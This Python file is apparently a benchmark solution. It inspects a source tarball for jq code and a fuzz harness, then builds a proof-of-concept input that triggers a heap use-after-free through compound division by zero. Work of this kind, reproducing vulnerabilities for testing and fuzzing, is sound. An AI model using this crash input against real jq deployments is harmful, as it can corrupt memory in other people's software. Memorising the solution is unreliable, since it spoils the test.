import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap use-after-free in compound division by zero.
        """
        # Filter that forces a numeric value then performs compound division by zero
        filter_str = ". = 1 | . /= 0"
        json_str = "1"

        # Default output if we can't detect anything: just the filter
        default_poc = filter_str.encode("utf-8")

        try:
            is_jq = False
            harness_content = ""

            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue

                    name_lower = member.name.lower()
                    if not name_lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                        continue

                    f = tf.extractfile(member)
                    if f is None:
                        continue

                    try:
                        text = f.read().decode("utf-8", "ignore")
                    finally:
                        f.close()

                    # Heuristics to detect jq sources
                    if ("jq_init(" in text or "jq_state" in text or "jv_parse(" in text or
                        "jq - command-line json processor" in text or "JQ_VERSION" in text):
                        is_jq = True

                    # Try to find a fuzz harness using jq
                    if "LLVMFuzzerTestOneInput" in text and ("jq_init(" in text or "jq_compile(" in text):
                        harness_content = text

            if not is_jq:
                # Unknown project, fall back to generic guess
                return default_poc

            # Try to infer delimiter between program and JSON, if any
            delim_char = None
            if harness_content:
                for line in harness_content.splitlines():
                    if "memchr" in line:
                        # Look for '\n' or '\0' in the memchr call
                        if "\\n" in line or "'\\n'" in line or "\"\\n\"" in line:
                            delim_char = "\n"
                            break
                        if "\\0" in line or "'\\0'" in line or "\"\\0\"" in line:
                            delim_char = "\0"
                            break
                        # Fallback for memchr(data, 0, size)
                        stripped = line.replace(" ", "")
                        if "memchr(" in stripped and ",0," in stripped:
                            delim_char = "\0"
                            break

            # If we couldn't infer, assume NUL delimiter (common in fuzz harnesses)
            if delim_char is None:
                delim_char = "\0"

            poc_str = filter_str + delim_char + json_str
            return poc_str.encode("utf-8")

        except Exception:
            # On any failure, return the simple filter-only PoC
            return default_poc